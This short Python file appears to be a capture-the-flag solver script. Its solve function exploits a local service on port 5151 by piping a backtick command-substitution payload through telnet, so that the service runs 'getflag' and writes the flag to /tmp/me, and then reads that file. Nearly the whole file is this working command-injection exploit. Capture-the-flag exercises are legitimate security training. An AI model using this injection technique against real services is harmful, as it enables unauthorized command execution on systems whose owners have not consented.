from solver.utils import extract_flag

def solve(connection):
	inject = connection.exec("echo '`getflag > /tmp/me`' | telnet localhost 5151")
	flag = extract_flag(connection.exec("cat /tmp/me"))
	return "", flag